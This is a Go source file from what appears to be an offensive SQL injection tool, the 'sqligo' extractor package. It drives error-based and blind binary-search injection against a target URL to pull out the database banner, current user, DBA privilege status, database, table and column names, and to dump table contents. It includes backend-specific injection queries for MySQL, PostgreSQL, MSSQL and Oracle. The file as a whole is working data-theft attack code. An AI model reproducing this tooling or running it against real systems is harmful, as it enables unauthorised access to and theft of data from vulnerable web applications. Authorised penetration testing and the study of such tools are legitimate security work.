package extractor

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/R0X4R/sqligo/pkg/logger"
	"github.com/R0X4R/sqligo/pkg/payloads"
	"github.com/R0X4R/sqligo/pkg/request"
)

type Extractor struct {
	Url               string
	Data              string
	Vector            string
	Parameter         string
	Backend           string
	BaseBody          string // For Boolean comparison
	InjectableColumns []int  // For Union-based
	ColumnCount       int    // For Union-based
}

func NewExtractor(urlStr, data, vector, parameter, backend string) *Extractor {
	// Fetch Baseline
	req := request.NewRequest(urlStr)
	req.Data = data
	resp, err := req.Execute()
	baseBody := ""
	if err == nil {
		baseBody = resp.Body
	} else {
		logger.Error("Extractor failed to fetch baseline: %v", err)
	}

	return &Extractor{
		Url:       urlStr,
		Data:      data,
		Vector:    vector,
		Parameter: parameter,
		Backend:   backend,
		BaseBody:  baseBody,
	}
}

func (e *Extractor) getQuery(mapData map[string][]string, args ...interface{}) string {
	payloadsList, ok := mapData[e.Backend]
	if !ok || len(payloadsList) == 0 {
		logger.Error("No extraction payloads found for backend: %s", e.Backend)
		return ""
	}
	// Use first payload for now
	queryFmt := payloadsList[0]
	return fmt.Sprintf(queryFmt, args...)
}

func (e *Extractor) ExtractBanner() string {
	logger.Info("Fetching banner...")
	// Standard SQL usually, but can vary
	query := "VERSION()"
	if e.Backend == "Microsoft SQL Server" {
		query = "@@VERSION"
	} else if e.Backend == "Oracle" {
		query = "(SELECT BANNER FROM v$version WHERE ROWNUM=1)"
	}
	return e.ExtractData(query)
}

func (e *Extractor) ExtractCurrentDB() string {
	logger.Info("Fetching current database...")
	query := "DATABASE()"
	if e.Backend == "PostgreSQL" {
		query = "CURRENT_DATABASE()"
	} else if e.Backend == "Microsoft SQL Server" {
		query = "DB_NAME()"
	} else if e.Backend == "Oracle" {
		query = "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL)"
	}
	return e.ExtractData(query)
}

func (e *Extractor) ExtractCurrentUser() string {
	logger.Info("Fetching current user...")
	query := "USER()"
	if e.Backend == "PostgreSQL" {
		query = "CURRENT_USER"
	} else if e.Backend == "Microsoft SQL Server" {
		query = "USER_NAME()"
	} else if e.Backend == "Oracle" {
		query = "(SELECT USER FROM DUAL)"
	}
	return e.ExtractData(query)
}

func (e *Extractor) ExtractIsDba() bool {
	logger.Info("Checking if current user is DBA...")
	var query string
	if e.Backend == "MySQL" {
		query = "(SELECT IF(super_priv='Y',1,0) FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1) LIMIT 0,1)"
	} else if e.Backend == "PostgreSQL" {
		query = "(SELECT CASE WHEN current_setting('is_superuser')='on' THEN 1 ELSE 0 END)"
	} else if e.Backend == "Microsoft SQL Server" {
		query = "(SELECT IS_SRVROLEMEMBER('sysadmin'))"
	} else if e.Backend == "Oracle" {
		query = "(SELECT (CASE WHEN count(*)>0 THEN 1 ELSE 0 END) FROM session_roles WHERE ROLE='DBA')"
	}

	res := e.ExtractData(query)
	return res == "1"
}

// ExtractData attempts to extract data using Error-Based injection first, then falls back to Blind.
func (e *Extractor) ExtractData(query string) string {
	val, ok := e.ExtractErrorBased(query)
	if ok {
		return val
	}
	return e.BinarySearch(query, nil)
}

func (e *Extractor) ExtractDbs() []string {
	logger.Info("Fetching database names...")

	// 1. Get Count
	countQuery := e.getQuery(payloads.PayloadsDbsCount)
	if countQuery == "" {
		return []string{}
	}
	countStr := e.ExtractData(countQuery)
	logger.Success("Found %s databases", countStr)

	count, _ := strconv.Atoi(countStr)
	if count == 0 {
		return []string{}
	}

	// 2. Fetch Names
	var dbs []string

	rawQuery := e.getQuery(payloads.PayloadsDbsNames)

	for i := 0; i < count; i++ {
		// Replace limit/offset
		// MySQL: LIMIT 0,1 -> LIMIT i,1
		// PG: OFFSET 0 LIMIT 1 -> OFFSET i LIMIT 1
		// MSSQL: TOP 1 ... NOT IN (TOP 0 ...) -> TOP 1 ... NOT IN (TOP i ...)
		// Oracle: WHERE LIMIT=1 -> WHERE LIMIT=i+1

		currentQuery := rawQuery
		if strings.Contains(currentQuery, "LIMIT 0,1") {
			currentQuery = strings.Replace(currentQuery, "LIMIT 0,1", fmt.Sprintf("LIMIT %d,1", i), 1)
		} else if strings.Contains(currentQuery, "OFFSET 0") {
			currentQuery = strings.Replace(currentQuery, "OFFSET 0", fmt.Sprintf("OFFSET %d", i), 1)
		} else if strings.Contains(currentQuery, "TOP 0") {
			// MSSQL double injection for offset
			currentQuery = strings.Replace(currentQuery, "TOP 0", fmt.Sprintf("TOP %d", i), 1)
		} else if strings.Contains(currentQuery, "LIMIT=1") {
			currentQuery = strings.Replace(currentQuery, "LIMIT=1", fmt.Sprintf("LIMIT=%d", i+1), 1)
		}

		db := e.ExtractData(currentQuery)
		if db != "" {
			dbs = append(dbs, db)
			logger.Progress("[%d/%d] %s", i+1, count, db)
		}
	}

	return dbs
}

func (e *Extractor) ExtractTables(db string) []string {
	logger.Info("Fetching tables for database '%s'...", db)
	// Get Count
	// countQuery := e.getQuery(payloads.PayloadsTblsCount, db)

	// Fetch First Table
	nameQuery := e.getQuery(payloads.PayloadsTblsNames, db, db) // Some require 2 args (MSSQL sysobjects)
	if e.Backend == "Microsoft SQL Server" {
		// Quick fix for formatted string args in MSSQL which appears twice in some queries
		nameQuery = e.getQuery(payloads.PayloadsTblsNames, db, db)
	} else {
		nameQuery = e.getQuery(payloads.PayloadsTblsNames, db)
	}

	table := e.BinarySearch(nameQuery, nil)
	return []string{table}
}

func (e *Extractor) ExtractColumns(db, table string) []string {
	logger.Info("Fetching columns for table '%s'...", table)

	// Determine args based on backend - some queries need multiple injections of db/table
	var nameQuery string
	if e.Backend == "Microsoft SQL Server" {
		nameQuery = e.getQuery(payloads.PayloadsColsNames, db, db, table, db, db, table) // Simplified handle
		// Ideally we parsed the %s count.
		// For now, using the first payload which is complex.
		// Let's rely on fmt.Sprintf tolerating extra args or we need specific logic.
		// Re-reading payloads.go: MSSQL: ...FROM %s..syscolumns... FROM %s..sysobjects... WHERE name='%s'...
		// It needs db, db, table.
		nameQuery = e.getQuery(payloads.PayloadsColsNames, db, db, table, db, db, table)
	} else {
		nameQuery = e.getQuery(payloads.PayloadsColsNames, db, table)
	}

	col := e.BinarySearch(nameQuery, nil)
	return []string{col}
}

func (e *Extractor) DumpTable(db, table string, columns []string) {
	logger.Info("Dumping table '%s'...", table)
	cols := "*"
	if len(columns) > 0 {
		cols = columns[0]
	}

	// PayloadRecsDump: SELECT %s FROM %s.%s ...
	// Args: col, db, table
	dumpQuery := e.getQuery(payloads.PayloadsRecsDump, cols, db, table, cols, db, table)
	if e.Backend != "Microsoft SQL Server" {
		dumpQuery = e.getQuery(payloads.PayloadsRecsDump, cols, db, table)
	}

	data := e.BinarySearch(dumpQuery, nil)
	logger.Success("Retrieved Data: %s", data)
}
